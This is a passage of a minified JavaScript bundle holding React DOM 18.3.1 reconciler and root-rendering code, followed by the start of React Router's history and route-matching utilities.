c=i.stateNode;if(typeof i.type.getDerivedStateFromError=="function"||typeof c.componentDidCatch=="function"&&($n===null||!$n.has(c))){n=ri(u,n),n=wf(i,n,1),i=Gn(i,n,1),n=At(),i!==null&&(Pi(i,1,n),Rt(i,n));break}}i=i.return}}function Vg(n,i,u){var c=n.pingCache;c!==null&&c.delete(i),i=At(),n.pingedLanes|=n.suspendedLanes&u,lt===n&&(gt&u)===u&&(ut===4||ut===3&&(gt&130023424)===gt&&500>Ze()-ll?Cr(n,0):sl|=u),Rt(n,i)}function g0(n,i){i===0&&((n.mode&1)===0?i=1:(i=Za,Za<<=1,(Za&130023424)===0&&(Za=4194304)));var u=At();n=Ln(n,i),n!==null&&(Pi(n,i,u),Rt(n,u))}function $g(n){var i=n.memoizedState,u=0;i!==null&&(u=i.retryLane),g0(n,u)}function qg(n,i){var u=0;switch(n.tag){case 13:var c=n.stateNode,f=n.memoizedState;f!==null&&(u=f.retryLane);break;case 19:c=n.stateNode;break;default:throw Error(r(314))}c!==null&&c.delete(i),g0(n,u)}var E0;E0=function(n,i,u){if(n!==null)if(n.memoizedProps!==i.pendingProps||kt.current)Nt=!0;else{if((n.lanes&u)===0&&(i.flags&128)===0)return Nt=!1,Fg(n,i,u);Nt=(n.flags&131072)!==0}else Nt=!1,Ge&&(i.flags&1048576)!==0&&$d(i,Su,i.index);switch(i.lanes=0,i.tag){case 2:var c=i.type;Mu(n,i),n=i.pendingProps;var f=$r(i,Et.current);ti(i,u),f=Us(null,i,c,n,f,u);var m=zs();return i.flags|=1,typeof f=="object"&&f!==null&&typeof f.render=="function"&&f.$$typeof===void 0?(i.tag=1,i.memoizedState=null,i.updateQueue=null,It(c)?(m=!0,Tu(i)):m=!1,i.memoizedState=f.state!==null&&f.state!==void 0?f.state:null,Ps(i),f.updater=wu,i.stateNode=f,f._reactInternals=i,Gs(i,c,n,u),i=Ks(null,i,c,!0,m,u)):(i.tag=0,Ge&&m&&Cs(i),xt(null,i,f,u),i=i.child),i;case 16:c=i.elementType;e:{switch(Mu(n,i),n=i.pendingProps,f=c._init,c=f(c._payload),i.type=c,f=i.tag=Jg(c),n=nn(c,n),f){case 0:i=qs(null,i,c,n,u);break e;case 1:i=jf(null,i,c,n,u);break e;case 11:i=Bf(null,i,c,n,u);break e;case 14:i=Hf(null,i,c,nn(c.type,n),u);break e}throw Error(r(306,c,""))}return i;case 0:return c=i.type,f=i.pendingProps,f=i.elementType===c?f:nn(c,f),qs(n,i,c,f,u);case 1:return c=i.type,f=i.pendingProps,f=i.elementType===c?f:nn(c,f),jf(n,i,c,f,u);case 3:e:{if(Qf(i),n===null)throw Error(r(387));c=i.pendingProps,m=i.memoizedState,f=m.element,af(n,i),ku(i,c,null,u);var b=i.memoizedState;if(c=b.element,m.isDehydrated)if(m={element:c,isDehydrated:!1,cache:b.cache,pendingSuspenseBoundaries:b.pendingSuspenseBoundaries,transitions:b.transitions},i.updateQueue.baseState=m,i.memoizedState=m,i.flags&256){f=ri(Error(r(423)),i),i=Yf(n,i,c,u,f);break e}else if(c!==f){f=ri(Error(r(424)),i),i=Yf(n,i,c,u,f);break e}else for(Ht=Wn(i.stateNode.containerInfo.firstChild),Bt=i,Ge=!0,tn=null,u=nf(i,null,c,u),i.child=u;u;)u.flags=u.flags&-3|4096,u=u.sibling;else{if(Jr(),c===f){i=In(n,i,u);break e}xt(n,i,c,u)}i=i.child}return i;case 5:return sf(i),n===null&&Ls(i),c=i.type,f=i.pendingProps,m=n!==null?n.memoizedProps:null,b=f.children,Es(c,f)?b=null:m!==null&&Es(c,m)&&(i.flags|=32),Wf(n,i),xt(n,i,b,u),i.child;case 6:return n===null&&Ls(i),null;case 13:return Xf(n,i,u);case 4:return ws(i,i.stateNode.containerInfo),c=i.pendingProps,n===null?i.child=Zr(i,null,c,u):xt(n,i,c,u),i.child;case 11:return c=i.type,f=i.pendingProps,f=i.elementType===c?f:nn(c,f),Bf(n,i,c,f,u);case 7:return xt(n,i,i.pendingProps,u),i.child;case 8:return xt(n,i,i.pendingProps.children,u),i.child;case 12:return xt(n,i,i.pendingProps.children,u),i.child;case 10:e:{if(c=i.type._context,f=i.pendingProps,m=i.memoizedProps,b=f.value,je(xu,c._currentValue),c._currentValue=b,m!==null)if(en(m.value,b)){if(m.children===f.children&&!kt.current){i=In(n,i,u);break e}}else for(m=i.child,m!==null&&(m.return=i);m!==null;){var A=m.dependencies;if(A!==null){b=m.child;for(var N=A.firstContext;N!==null;){if(N.context===c){if(m.tag===1){N=kn(-1,u&-u),N.tag=2;var U=m.updateQueue;if(U!==null){U=U.shared;var $=U.pending;$===null?N.next=N:(N.next=$.next,$.next=N),U.pending=N}}m.lanes|=u,N=m.alternate,N!==null&&(N.lanes|=u),Rs(m.return,u,i),A.lanes|=u;break}N=N.next}}else if(m.tag===10)b=m.type===i.type?null:m.child;else if(m.tag===18){if(b=m.return,b===null)throw Error(r(341));b.lanes|=u,A=b.alternate,A!==null&&(A.lanes|=u),Rs(b,u,i),b=m.sibling}else b=m.child;if(b!==null)b.return=m;else for(b=m;b!==null;){if(b===i){b=null;break}if(m=b.sibling,m!==null){m.return=b.return,b=m;break}b=b.return}m=b}xt(n,i,f.children,u),i=i.child}return i;case 9:return f=i.type,c=i.pendingProps.children,ti(i,u),f=Xt(f),c=c(f),i.flags|=1,xt(n,i,c,u),i.child;case 14:return c=i.type,f=nn(c,i.pendingProps),f=nn(c.type,f),Hf(n,i,c,f,u);case 15:return Uf(n,i,i.type,i.pendingProps,u);case 17:return c=i.type,f=i.pendingProps,f=i.elementType===c?f:nn(c,f),Mu(n,i),i.tag=1,It(c)?(n=!0,Tu(i)):n=!1,ti(i,u),Rf(i,c,f),Gs(i,c,f,u),Ks(null,i,c,!0,n,u);case 19:return Vf(n,i,u);case 22:return zf(n,i,u)}throw Error(r(156,i.tag))};function T0(n,i){return qc(n,i)}function Kg(n,i,u,c){this.tag=n,this.key=u,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=i,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=c,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function $t(n,i,u,c){return new Kg(n,i,u,c)}function El(n){return n=n.prototype,!(!n||!n.isReactComponent)}function Jg(n){if(typeof n=="function")return El(n)?1:0;if(n!=null){if(n=n.$$typeof,n===oe)return 11;if(n===re)return 14}return 2}function Zn(n,i){var u=n.alternate;return u===null?(u=$t(n.tag,i,n.key,n.mode),u.elementType=n.elementType,u.type=n.type,u.stateNode=n.stateNode,u.alternate=n,n.alternate=u):(u.pendingProps=i,u.type=n.type,u.flags=0,u.subtreeFlags=0,u.deletions=null),u.flags=n.flags&14680064,u.childLanes=n.childLanes,u.lanes=n.lanes,u.child=n.child,u.memoizedProps=n.memoizedProps,u.memoizedState=n.memoizedState,u.updateQueue=n.updateQueue,i=n.dependencies,u.dependencies=i===null?null:{lanes:i.lanes,firstContext:i.firstContext},u.sibling=n.sibling,u.index=n.index,u.ref=n.ref,u}function Gu(n,i,u,c,f,m){var b=2;if(c=n,typeof n=="function")El(n)&&(b=1);else if(typeof n=="string")b=5;else e:switch(n){case me:return Ar(u.children,f,m,i);case Se:b=8,f|=8;break;case xe:return n=$t(12,u,i,f|2),n.elementType=xe,n.lanes=m,n;case Ae:return n=$t(13,u,i,f),n.elementType=Ae,n.lanes=m,n;case ce:return n=$t(19,u,i,f),n.elementType=ce,n.lanes=m,n;case ke:return Vu(u,f,m,i);default:if(typeof n=="object"&&n!==null)switch(n.$$typeof){case H:b=10;break e;case ue:b=9;break e;case oe:b=11;break e;case re:b=14;break e;case Le:b=16,c=null;break e}throw Error(r(130,n==null?n:typeof n,""))}return i=$t(b,u,i,f),i.elementType=n,i.type=c,i.lanes=m,i}function Ar(n,i,u,c){return n=$t(7,n,c,i),n.lanes=u,n}function Vu(n,i,u,c){return n=$t(22,n,c,i),n.elementType=ke,n.lanes=u,n.stateNode={isHidden:!1},n}function Tl(n,i,u){return n=$t(6,n,null,i),n.lanes=u,n}function bl(n,i,u){return i=$t(4,n.children!==null?n.children:[],n.key,i),i.lanes=u,i.stateNode={containerInfo:n.containerInfo,pendingChildren:null,implementation:n.implementation},i}function Zg(n,i,u,c,f){this.tag=i,this.containerInfo=n,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=Xo(0),this.expirationTimes=Xo(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Xo(0),this.identifierPrefix=c,this.onRecoverableError=f,this.mutableSourceEagerHydrationData=null}function _l(n,i,u,c,f,m,b,A,N){return n=new Zg(n,i,u,A,N),i===1?(i=1,m===!0&&(i|=8)):i=0,m=$t(3,null,null,i),n.current=m,m.stateNode=n,m.memoizedState={element:c,isDehydrated:u,cache:null,transitions:null,pendingSuspenseBoundaries:null},Ps(m),n}function eE(n,i,u){var c=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:z,key:c==null?null:""+c,children:n,containerInfo:i,implementation:u}}function b0(n){if(!n)return Qn;n=n._reactInternals;e:{if(hr(n)!==n||n.tag!==1)throw Error(r(170));var i=n;do{switch(i.tag){case 3:i=i.stateNode.context;break e;case 1:if(It(i.type)){i=i.stateNode.__reactInternalMemoizedMergedChildContext;break e}}i=i.return}while(i!==null);throw Error(r(171))}if(n.tag===1){var u=n.type;if(It(u))return Xd(n,u,i)}return i}function _0(n,i,u,c,f,m,b,A,N){return n=_l(u,c,!0,n,f,m,b,A,N),n.context=b0(null),u=n.current,c=At(),f=Kn(u),m=kn(c,f),m.callback=i??null,Gn(u,m,f),n.current.lanes=f,Pi(n,f,c),Rt(n,c),n}function $u(n,i,u,c){var f=i.current,m=At(),b=Kn(f);return u=b0(u),i.context===null?i.context=u:i.pendingContext=u,i=kn(m,b),i.payload={element:n},c=c===void 0?null:c,c!==null&&(i.callback=c),n=Gn(f,i,b),n!==null&&(un(n,f,b,m),Lu(n,f,b)),b}function qu(n){return n=n.current,n.child?(n.child.tag===5,n.child.stateNode):null}function S0(n,i){if(n=n.memoizedState,n!==null&&n.dehydrated!==null){var u=n.retryLane;n.retryLane=u!==0&&u<i?u:i}}function Sl(n,i){S0(n,i),(n=n.alternate)&&S0(n,i)}function tE(){return null}var y0=typeof reportError=="function"?reportError:function(n){console.error(n)};function yl(n){this._internalRoot=n}Ku.prototype.render=yl.prototype.render=function(n){var i=this._internalRoot;if(i===null)throw Error(r(409));$u(n,i,null,null)},Ku.prototype.unmount=yl.prototype.unmount=function(){var n=this._internalRoot;if(n!==null){this._internalRoot=null;var i=n.containerInfo;yr(function(){$u(null,n,null,null)}),i[yn]=null}};function Ku(n){this._internalRoot=n}Ku.prototype.unstable_scheduleHydration=function(n){if(n){var i=id();n={blockedOn:null,target:n,priority:i};for(var u=0;u<Hn.length&&i!==0&&i<Hn[u].priority;u++);Hn.splice(u,0,n),u===0&&od(n)}};function Cl(n){return!(!n||n.nodeType!==1&&n.nodeType!==9&&n.nodeType!==11)}function Ju(n){return!(!n||n.nodeType!==1&&n.nodeType!==9&&n.nodeType!==11&&(n.nodeType!==8||n.nodeValue!==" react-mount-point-unstable "))}function C0(){}function nE(n,i,u,c,f){if(f){if(typeof c=="function"){var m=c;c=function(){var U=qu(b);m.call(U)}}var b=_0(i,c,n,0,null,!1,!1,"",C0);return n._reactRootContainer=b,n[yn]=b.current,Gi(n.nodeType===8?n.parentNode:n),yr(),b}for(;f=n.lastChild;)n.removeChild(f);if(typeof c=="function"){var A=c;c=function(){var U=qu(N);A.call(U)}}var N=_l(n,0,!1,null,null,!1,!1,"",C0);return n._reactRootContainer=N,n[yn]=N.current,Gi(n.nodeType===8?n.parentNode:n),yr(function(){$u(i,N,u,c)}),N}function Zu(n,i,u,c,f){var m=u._reactRootContainer;if(m){var b=m;if(typeof f=="function"){var A=f;f=function(){var N=qu(b);A.call(N)}}$u(i,b,n,f)}else b=nE(u,i,n,f,c);return qu(b)}nd=function(n){switch(n.tag){case 3:var i=n.stateNode;if(i.current.memoizedState.isDehydrated){var u=Oi(i.pendingLanes);u!==0&&(Go(i,u|1),Rt(i,Ze()),(Fe&6)===0&&(ui=Ze()+500,Yn()))}break;case 13:yr(function(){var c=Ln(n,1);if(c!==null){var f=At();un(c,n,1,f)}}),Sl(n,1)}},Vo=function(n){if(n.tag===13){var i=Ln(n,134217728);if(i!==null){var u=At();un(i,n,134217728,u)}Sl(n,134217728)}},rd=function(n){if(n.tag===13){var i=Kn(n),u=Ln(n,i);if(u!==null){var c=At();un(u,n,i,c)}Sl(n,i)}},id=function(){return ze},ad=function(n,i){var u=ze;try{return ze=n,i()}finally{ze=u}},Uo=function(n,i,u){switch(i){case"input":if(Mr(n,u),i=u.name,u.type==="radio"&&i!=null){for(u=n;u.parentNode;)u=u.parentNode;for(u=u.querySelectorAll("input[name="+JSON.stringify(""+i)+'][type="radio"]'),i=0;i<u.length;i++){var c=u[i];if(c!==n&&c.form===n.form){var f=gu(c);if(!f)throw Error(r(90));ja(c),Mr(c,f)}}}break;case"textarea":Xa(n,u);break;case"select":i=u.value,i!=null&&wn(n,!!u.multiple,i,!1)}},jc=pl,Qc=yr;var rE={usingClientEntryPoint:!1,Events:[qi,Gr,gu,zc,Wc,pl]},ca={findFiberByHostInstance:pr,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},iE={bundleType:ca.bundleType,version:ca.version,rendererPackageName:ca.rendererPackageName,rendererConfig:ca.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:ie.ReactCurrentDispatcher,findHostInstanceByFiber:function(n){return n=Vc(n),n===null?null:n.stateNode},findFiberByHostInstance:ca.findFiberByHostInstance||tE,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var eo=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!eo.isDisabled&&eo.supportsFiber)try{Ka=eo.inject(iE),dn=eo}catch{}}return Ot.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=rE,Ot.createPortal=function(n,i){var u=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!Cl(i))throw Error(r(200));return eE(n,i,null,u)},Ot.createRoot=function(n,i){if(!Cl(n))throw Error(r(299));var u=!1,c="",f=y0;return i!=null&&(i.unstable_strictMode===!0&&(u=!0),i.identifierPrefix!==void 0&&(c=i.identifierPrefix),i.onRecoverableError!==void 0&&(f=i.onRecoverableError)),i=_l(n,1,!1,null,null,u,!1,c,f),n[yn]=i.current,Gi(n.nodeType===8?n.parentNode:n),new yl(i)},Ot.findDOMNode=function(n){if(n==null)return null;if(n.nodeType===1)return n;var i=n._reactInternals;if(i===void 0)throw typeof n.render=="function"?Error(r(188)):(n=Object.keys(n).join(","),Error(r(268,n)));return n=Vc(i),n=n===null?null:n.stateNode,n},Ot.flushSync=function(n){return yr(n)},Ot.hydrate=function(n,i,u){if(!Ju(i))throw Error(r(200));return Zu(null,n,i,!0,u)},Ot.hydrateRoot=function(n,i,u){if(!Cl(n))throw Error(r(405));var c=u!=null&&u.hydratedSources||null,f=!1,m="",b=y0;if(u!=null&&(u.unstable_strictMode===!0&&(f=!0),u.identifierPrefix!==void 0&&(m=u.identifierPrefix),u.onRecoverableError!==void 0&&(b=u.onRecoverableError)),i=_0(i,null,n,1,u??null,f,!1,m,b),n[yn]=i.current,Gi(n),c)for(n=0;n<c.length;n++)u=c[n],f=u._getVersion,f=f(u._source),i.mutableSourceEagerHydrationData==null?i.mutableSourceEagerHydrationData=[u,f]:i.mutableSourceEagerHydrationData.push(u,f);return new Ku(i)},Ot.render=function(n,i,u){if(!Ju(i))throw Error(r(200));return Zu(null,n,i,!1,u)},Ot.unmountComponentAtNode=function(n){if(!Ju(n))throw Error(r(40));return n._reactRootContainer?(yr(function(){Zu(null,null,n,!1,function(){n._reactRootContainer=null,n[yn]=null})}),!0):!1},Ot.unstable_batchedUpdates=pl,Ot.unstable_renderSubtreeIntoContainer=function(n,i,u,c){if(!Ju(u))throw Error(r(200));if(n==null||n._reactInternals===void 0)throw Error(r(38));return Zu(n,i,u,!1,c)},Ot.version="18.3.1-next-f1338f8080-20240426",Ot}var R0;function ap(){if(R0)return Ll.exports;R0=1;function e(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(e)}catch(t){console.error(t)}}return e(),Ll.exports=hE(),Ll.exports}var O0;function pE(){if(O0)return to;O0=1;var e=ap();return to.createRoot=e.createRoot,to.hydrateRoot=e.hydrateRoot,to}var mE=pE();const gE=yo(mE);ap();function Ia(){return Ia=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var r=arguments[t];for(var a in r)Object.prototype.hasOwnProperty.call(r,a)&&(e[a]=r[a])}return e},Ia.apply(this,arguments)}var ar;(function(e){e.Pop="POP",e.Push="PUSH",e.Replace="REPLACE"})(ar||(ar={}));const P0="popstate";function EE(e){e===void 0&&(e={});function t(o,s){let{pathname:l="/",search:h="",hash:p=""}=Or(o.location.hash.substr(1));return!l.startsWith("/")&&!l.startsWith(".")&&(l="/"+l),ql("",{pathname:l,search:h,hash:p},s.state&&s.state.usr||null,s.state&&s.state.key||"default")}function r(o,s){let l=o.document.querySelector("base"),h="";if(l&&l.getAttribute("href")){let p=o.location.href,g=p.indexOf("#");h=g===-1?p:p.slice(0,g)}return h+"#"+(typeof s=="string"?s:po(s))}function a(o,s){Co(o.pathname.charAt(0)==="/","relative pathnames are not supported in hash history.push("+JSON.stringify(s)+")")}return bE(t,r,a,e)}function Je(e,t){if(e===!1||e===null||typeof e>"u")throw new Error(t)}function Co(e,t){if(!e){typeof console<"u"&&console.warn(t);try{throw new Error(t)}catch{}}}function TE(){return Math.random().toString(36).substr(2,8)}function w0(e,t){return{usr:e.state,key:e.key,idx:t}}function ql(e,t,r,a){return r===void 0&&(r=null),Ia({pathname:typeof e=="string"?e:e.pathname,search:"",hash:""},typeof t=="string"?Or(t):t,{state:r,key:t&&t.key||a||TE()})}function po(e){let{pathname:t="/",search:r="",hash:a=""}=e;return r&&r!=="?"&&(t+=r.charAt(0)==="?"?r:"?"+r),a&&a!=="#"&&(t+=a.charAt(0)==="#"?a:"#"+a),t}function Or(e){let t={};if(e){let r=e.indexOf("#");r>=0&&(t.hash=e.substr(r),e=e.substr(0,r));let a=e.indexOf("?");a>=0&&(t.search=e.substr(a),e=e.substr(0,a)),e&&(t.pathname=e)}return t}function bE(e,t,r,a){a===void 0&&(a={});let{window:o=document.defaultView,v5Compat:s=!1}=a,l=o.history,h=ar.Pop,p=null,g=T();g==null&&(g=0,l.replaceState(Ia({},l.state,{idx:g}),""));function T(){return(l.state||{idx:null}).idx}function E(){h=ar.Pop;let P=T(),w=P==null?null:P-g;g=P,p&&p({action:h,location:F.location,delta:w})}function _(P,w){h=ar.Push;let Q=ql(F.location,P,w);r&&r(Q,P),g=T()+1;let j=w0(Q,g),ie=F.createHref(Q);try{l.pushState(j,"",ie)}catch(de){if(de instanceof DOMException&&de.name==="DataCloneError")throw de;o.location.assign(ie)}s&&p&&p({action:h,location:F.location,delta:1})}function S(P,w){h=ar.Replace;let Q=ql(F.location,P,w);r&&r(Q,P),g=T();let j=w0(Q,g),ie=F.createHref(Q);l.replaceState(j,"",ie),s&&p&&p({action:h,location:F.location,delta:0})}function I(P){let w=o.location.origin!=="null"?o.location.origin:o.location.href,Q=typeof P=="string"?P:po(P);return Q=Q.replace(/ $/,"%20"),Je(w,"No window.location.(origin|href) available to create URL for href: "+Q),new URL(Q,w)}let F={get action(){return h},get location(){return e(o,l)},listen(P){if(p)throw new Error("A history only accepts one active listener");return o.addEventListener(P0,E),p=P,()=>{o.removeEventListener(P0,E),p=null}},createHref(P){return t(o,P)},createURL:I,encodeLocation(P){let w=I(P);return{pathname:w.pathname,search:w.search,hash:w.hash}},push:_,replace:S,go(P){return l.go(P)}};return F}var D0;(function(e){e.data="data",e.deferred="deferred",e.redirect="redirect",e.error="error"})(D0||(D0={}));function _E(e,t,r){return r===void 0&&(r="/"),SE(e,t,r)}function SE(e,t,r,a){let o=typeof t=="string"?Or(t):t,s=pi(o.pathname||"/",r);if(s==null)return null;let l=up(e);yE(l);let h=null;for(let p=0;h==null&&p<l.length;++p){let g=PE(s);h=RE(l[p],g)}return h}function up(e,t,r,a){t===void 0&&(t=[]),r===void 0&&(r=[]),a===void 0&&(a="");let o=(s,l,h)=>{let p={relativePath:h===void 0?s.path||"":h,caseSensitive:s.caseSensitive===!0,childrenIndex:l,route:s};p.relativePath.startsWith("/")&&(Je(p.relativePath.startsWith(a),'Absolute route path "'+p.relativePath+'" nested under path '+('"'+a+'" is not valid. An absolute child route path ')+"must start with the combined path of all its parent routes."),p.relativePath=p.relativePath.slice(a.length));let g=or([a,p.relativePath]),T=r.concat(p);s.children&&s.children.length>0&&(Je(s.index!==!0,"Index routes must not have child routes. Please remove "+('all child routes from route path "'+g+'".')),up(s.children,t,T,g)),!(s.path==null&&!s.index)&&t.push({path:g,score:NE(g,s.index),routesMeta:T})};return e.forEach((s,l)=>{var h;if(s.path===""||!((h=s.path)!=null&&h.includes("?")))o(s,l);else for(let p of op(s.path))o(s,l,p)}),t}function op(e){let t=e.split("/");if(t.length===0)return[];let[r,...a]=t,o=r.endsWith("?"),s=r.replace(/\?$/,"");if(a.length===0)return o?[s,""]:[s];let l=op(a.join("/")),h=[];return h.push(...l.map(p=>p===""?s:[s,p].join("/"))),o&&h.push(...l),h.map(p=>e.startsWith("/")&&p===""?"/":p)}function yE(e){e.sort((t,r)=>t.score!==r.score?r.score-t.score:vE(t.routesMeta.map(a=>a.childrenIndex),r.routesMeta.map(a=>a.childrenIndex)))}const CE=/^:[\w-]+$/,xE=3,AE=2,LE=1,kE=10,IE=-2,M0=e=>e==="*";function NE(e,t){let r=e.split("/"),a=r.length;return r.some(M0)&&(a+=IE),t&&(a+=AE),r.filter(o=>!M0(o)).reduce((o,s)=>o+(CE.test(s)?xE:s===""?LE:kE),a)}function vE(e,t){return e.length===t.length&&e.slice(0,-1).every((a,o)=>a===t[o])?e[e.length-1]-t[t.length-1]:0}function RE(e,t,r){let{routesMeta:a}=e,o={},s="/",l=[];for(let h=0;h<a.length;++h){let p=a[h],g=h===a.length-1,T=s==="/"?t:t.slice(s.length)||"/",E=Kl({path:p.relativePath,caseSensitive:p.caseSensitive,end:g},T),_=p.route;if(!E)return null;Object.assign(o,E.params),l.push({params:o,pathname:or([s,E.pathname]),pathnameBase:BE(or([s,E.pathnameBase])),route:_}),E.pathnameBase!=="/"&&(s=or([s,E.pathnameBase]))}return l}function Kl(e,t){typeof e=="string"&&(e={path:e,caseSensitive:!1,end:!0});let[r,a]=OE(e.path,e.caseSensitive,e.end),o=t.match(r);if(!o)return null;let s=o[0],l=s.replace(/(.)\/+$/,"$1"),h=o.slice(1);return{params:a.reduce((g,T,E)=>{let{paramName:_,isOptional:S}=T;if(_==="*"){let F=h[E]||"";l=s.slice(0,s.length-F.length).replace(/(.)\/+$/,"$1")}const I=h[E];return S&&!I?g[_]=void 0:g[_]=(I||"").replace(/%2F/g,"/"),g},{}),pathname:s,pathnameBase:l,pattern:e}}function OE(e,t,r){t===void 0&&(t=!1),r===void 0&&(r=!0),Co(e==="*"||!e.endsWith("*")||e.endsWith("/*"),'Route path "'+e+'" will be treated as if it were '+('"'+e.replace(/\*$/,"/*")+'" because the `*` character must ')+"always follow a `/` in the pattern. To get rid of this warning, "+('please change the route path to "'+e.replace(/\*$/,"/*")+'".'));let a=[],o="^"+e.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(l,h,p)=>(a.push({paramName:h,isOptional:p!=null}),p?"/?([^\\/]+)?":"/([^\\/]+)"));return e.endsWith("*")?(a.push({paramName:"*"}),o+=e==="*"||e==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):r?o+="\\/*$":e!==""&&e!=="/"&&(o+="(?:(?=\\/|$))"),[new RegExp(o,t?void 0:"i"),a]}function PE(e){try{return e.split("/").map(t=>decodeURIComponent(t).replace(/\//g,"%2F")).join("/")}catch(t){return Co(!1,'The URL path "'+e+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent '+("encoding ("+t+").")),e}}function pi(e,t){if(t==="/")return e;if(!e.toLowerCase().startsWith(t.toLowerCase()))return null;let r=t.endsWith("/")?t.length-1:t.length,a=e.charAt(r);return a&&a!=="/"?null:e.slice(r)||"/"}const wE=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,DE=e=>wE.test(e);function ME(e,t){t===void 0&&(t="/");let{pathname:r,search:a="",hash:o=""}=typeof e=="string"?Or(e):e,s;if(r)if(DE(r))s=r;else{if(r.includes("//")){let l=r;r=r.replace(/\/\/+/g,"/"),Co(!1,"Pathnames cannot have embedded double slashes - normalizing "+(l+" -> "+r))}r.startsWith("/")?s=F0(r.substring(1),"/"):s=F0(r,t)}else s=t;return{pathname:s,search:HE(a),hash:UE(o)}}function F0(e,t){let r=t.replace(/\/+$/,"").split("/");return e.split("/").forEach(o=>{o===".."?r.length>1&&r.pop():o!=="."&&r.push(o)}),r.length>1?r.join("/"):"/"}function Nl(e,t,r,a){return"Cannot include a '"+e+"' character in a manually specified "+("`to."+t+"` field ["+JSON.stringify(a)+"].  Please separate it out to the ")+("`to."+r+"` field. Alternatively you may provide the full path as ")+'a string in <Link to="..."> and the router will parse it for you.'}function FE(e){return e.filter((t,r)=>r===0||t.route.path&&t.route.path.length>0)}function sp(e,t){let r=FE(e);return t?r.map((a,o)=>o===r.length-1?a.pathname:a.pathnameBase):r.map(a=>a.pathnameBase)}function lp(e,t,r,a){a===void 0&&(a=!1);let o;typeof e=="string"?o=Or(e):(o=Ia({},e),Je(!o.pathname||!o.pathname.includes("?"),Nl("?","pathname","search",o)),Je(!o.pathname||!o.pathname.includes("#"),Nl("#","pathname","hash",o)),Je(!o.search||!o.search.includes("#"),Nl("#","search","hash",o)));let s=e===""||o.pathname==="",l=s?"/":o.pathname,h;if(l==null)h=r;else{let E=t.length-1;if(!a&&l.startsWith("..")){let _=l.split("/");for(;_[0]==="..";)_.shift(),E-=1;o.pathname=_.join("/")}h=E>=0?t[E]:"/"}let p=ME(o,h),g=l&&l!=="/"&&l.endsWith("/"),T=(s||l===".")&&r.endsWith("/");return!p.pathname.endsWith("/")&&(g||T)&&(p.pathname+="/"),p}const or=e=>e.join("/").replace(/\/\/+/g,"/"),BE=e=>e.replace(/\/+$/,"").replace(/^\/*/,"/"),HE=e=>!e||e==="?"?"":e.startsWith("?")?e:"?"+e,UE=e=>!e||e==="#"?"":e.startsWith("#")?e:"#"+e;function zE(e){return e!=null&&typeof e.status=="number"&&typeof e.statusText=="string"&&typeof e.internal=="boolean"&&"data"in e}const cp=["post","put","patch","delete"];new Set(cp);const WE=["get",...cp];new Set(WE);function Na(){return Na=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var r=arguments[t];for(var a in r)Object.prototype.hasOwnProperty.call(r,a)&&(e[a]=r[a])}return e},Na.apply(this,arguments)}const xo=ne.createContext(null),dp=ne.createContext(null),sr=ne.createContext(null),Ao=ne.createContext(null),lr=ne.createContext({outlet:null,matches:[],isDataRoute:!1}),fp=ne.createContext(null);function jE(e,t){let{relative:r}=t===void 0?{}:t;Da()||Je(!1);let{basename:a,navigator:o}=ne.useContext(sr),{hash:s,pathname:l,search:h}=Lo(e,{relative:r}),p=l;return a!=="/"&&(p=l==="/"?a:or([a,l])),o.createHref({pathname:p,search:h,hash:s})}function Da(){return ne.useContext(Ao)!=null}function bi(){return Da()||Je(!1),ne.useContext(Ao).location}function hp(e){ne.useContext(sr).static||ne.useLayoutEffect(e)}function pp(){let{isDataRoute:e}=ne.useContext(lr);return e?rT():QE()}function QE(){Da()||Je(!1);let e=ne.useContext(xo),{basename:t,future:r,navigator:a}=ne.useContext(sr),{matches:o}=ne.useContext(lr),{pathname:s}=bi(),l=JSON.stringify(sp(o,r.v7_relativeSplatPath)),h=ne.useRef(!1);return hp(()=>{h.current=!0}),ne.useCallback(function(g,T){if(T===void 0&&(T={}),!h.current)return;if(typeof g=="number"){a.go(g);return}let E=lp(g,JSON.parse(l),s,T.relative==="path");e==null&&t!=="/"&&(E.pathname=E.pathname==="/"?t:or([t,E.pathname])),(T.replace?a.replace:a.push)(E,T.state,T)},[t,a,l,s,e])}function YE(){let{matches:e}=ne.useContext(lr),t=e[e.length-1];return t?t.params:{}}function Lo(e,t){let{relative:r}=t===void 0?{}:t,{future:a}=ne.useContext(sr),{matches:o}=ne.useContext(lr),{pathname:s}=bi(),l=JSON.stringify(sp(o,a.v7_relativeSplatPath));return ne.useMemo(()=>lp(e,JSON.parse(l),s,r==="path"),[e,l,s,r])}function XE(e,t){return GE(e,t)}function 